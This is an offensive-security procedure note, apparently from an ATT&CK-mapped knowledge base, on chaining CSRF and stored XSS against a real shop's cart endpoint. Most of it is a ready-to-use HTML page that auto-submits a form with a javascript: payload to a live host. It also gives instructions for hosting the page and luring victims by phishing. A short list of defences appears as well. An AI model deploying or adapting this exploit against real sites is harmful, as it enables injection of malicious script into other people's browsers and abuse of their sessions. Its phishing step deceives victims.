---
id: proc-csrf-xss-injection-001
tags:
  - csrf
  - xss
  - automation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Forge Web Credentials]]'
updated_at: '2025-12-14T03:15:53.365Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Forge Web Credentials]]'
---
# Automate-Injection-with-CSRF-Form

## Summary

This procedure creates an HTML page with an auto-submitting form to perform a CSRF attack, injecting the XSS payload into the target's cart without direct interaction.

## Description

Host a malicious HTML page that uses JavaScript to submit a form to /cart/add with the payload in properties[Artwork file]. When a victim visits this page (e.g., via phishing), it auto-posts, storing the XSS. This bypasses same-origin checks since the target lacks CSRF tokens. Leads to stored XSS on cart views. Requires hosting the HTML; impacts multiple users.

## Requirements

1. Web server to host the HTML form
2. Victim to visit the attacker-controlled page
3. Same payload as injection step

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on state-changing endpoints like /cart/add
- Validate referer/origin headers for form submissions
- Educate users on phishing and external link risks

## Objectives

1. Automate payload injection via CSRF
2. Store XSS without target-site interaction
3. Amplify attack reach

## Instructions

### Step 1: Create the CSRF HTML

**Context**: Build the auto-submit form.

Create csfr.html:
```html
<!DOCTYPE html>
<html><body>
<form id="xssform" action="http://hardware.shopify.com/cart/add" method="POST" enctype="multipart/form-data">
<input type="hidden" name="id" value="976094353">
<input type="hidden" name="properties[Artwork file]" value="javascript:alert(document.domain) //http://google.com/uploads/pwned.jpg">
<input type="hidden" name="production-time" value="standard">
</form>
<script>document.getElementById('xssform').submit();</script>
</body></html>
```

> Form submits on load.

### Step 2: Host and Lure Victim

**Context**: Deliver to victim.

Host on attacker server (e.g., via GitHub Pages) and send link via email/phishing.

> Expected output: Victim's browser submits, stores payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Forge Web Credentials]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[xss]]
